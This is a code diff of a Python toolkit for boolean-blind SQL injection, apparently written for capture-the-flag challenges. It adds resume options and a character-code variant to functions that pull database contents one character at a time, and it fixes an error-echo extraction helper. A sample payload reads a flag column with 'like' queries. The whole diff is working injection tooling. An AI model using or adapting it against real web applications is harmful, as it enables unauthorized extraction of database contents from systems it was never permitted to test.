@@ -41,10 +41,10 @@ p8 = 'select group_concat(flagass233) like "{}%" from flag233333'
 sf.BoolBi_like(chk,p7,p8,stv.AlphabetLike)
 # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
 '''
-def BoolBi(chk,pl1="",pl2="",abl=Alphabet):
+def BoolBi(chk,pl1="",pl2="",abl=Alphabet,start='',startn=1):
     print(chk('1=0'), chk('1=1'))
     l=500
-    for i in range(200):
+    for i in range(startn,200):
         pl=pl1.format(i)
         print(i,end=' ')
         if chk(pl):
@@ -54,14 +54,46 @@ def BoolBi(chk,pl1="",pl2="",abl=Alphabet):
     print('- '*60)
     printc('Length:%d'%l,cmd_color.light_green)
 
-    strx = ''
-    for i in range(1,l+1):
+    strx = start
+    for i in range(len(start)+1,l+1):
         printbi(i,strx,l+5)
         for j in abl:
             pl=pl2.format(i,j)
             print(j,end='')
             if chk(pl):
                 strx+=j
+                break
+    print()
+    print('- '*60)
+    printc('Data: %s' % strx.replace(',','  |'), cmd_color.light_green)
+    print('- ' * 60)
+    return strx
+
+def BoolBi_n(chk,pl1="",pl2="",abl=Alphabet,start='',startn=1):
+    print(chk('1=0'), chk('1=1'))
+    l=500
+    for i in range(startn,200):
+        pl=pl1.format(i)
+        print(i,end=' ')
+        if chk(pl):
+            l=i
+            break
+    print()
+    print('- '*60)
+    printc('Length:%d'%l,cmd_color.light_green)
+
+    strx = start
+    for i in range(len(start)+1,l+1):
+        printbi(i,strx,l+5)
+        for x in abl:
+            if isinstance(x,str):
+                j=ord(x)
+            else :
+                j = int(x)
+            pl=pl2.format(i,j)
+            print(chr(j),end='')
+            if chk(pl):
+                strx+=chr(j)
                 break
     print()
     print('- '*60)
@@ -200,7 +232,7 @@ def err_echo_post(url,pl={},r = None,rend='</br>',headers=None,cookie=None):
     if r==None :
         return rt
     else:
-        rtl = regx.findall(rf'({r}.*?){rend}',rt)
+        rtl = regx.findall(rf'{r}(.*?){rend}',rt)
         if len(rtl)==0:
             return rt
         else:
